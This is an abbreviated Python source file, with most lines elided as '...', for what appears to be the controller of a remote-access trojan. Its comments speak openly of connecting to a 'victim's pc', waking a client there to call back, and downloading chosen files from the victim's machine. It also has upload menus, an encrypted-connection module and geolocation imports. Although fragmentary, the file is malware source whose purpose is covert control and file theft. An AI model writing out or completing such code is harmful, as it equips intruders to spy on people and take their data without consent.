# -*- coding: utf-8 -*
import socket,os, platform, time, encrypted_connection, datetime, geolocalisation, threading, argparse, logging
    ...
    while choice != "99" :
            ...
            while True :
                ...
                if int(fileChoiceNum) != (len(fileList) + 1) :
                    ...
                    if os.path.isfile(currentDirectory+"/"+fileChoicePath) :
                        ...
                        logging.info("Upload file Menu # chosen file: %s", chosenFile)
                        time.sleep(1)
                        consoleCleaner(False)
                        break
                    else :
        ...
        if choice == "3" :
            if chosenFile != "Unknown" :
                ...
                logging.info("Upload file Menu # No file has been choose before uploading")
                consoleCleaner(True)
        menu("uploadfile")
        choice = input(">")
    consoleCleaner(False)
...
def downloadFile(fileName : str): #Download a selected file on victim's pc and save it in downloaded_files
    ...
    try :
        ...
        if encrypter.DownloadFile(path, fileName):
            ...
            logging.warning("Download failed, the file you tried to download doesn't exist")
...
class ClientThread(threading.Thread) : #Thread that connect to the listening victim's pc and wake client on victim's pc
    ...
    def run(self):
        ...
        try :
            ...
            clientConnexion.initialize_tcp_connexion_client(self.HOSTCLIENT,self.PORTCLIENT)
        except :
        ...
        if not self.stop_thread :
            ...
            if command == "online":
                    ...
                    logging.info("Waking up victim's client to connect on the server")
...
logging.info("Credentials from argpars -> ip : %s | port : %s",hostClient, portClient)
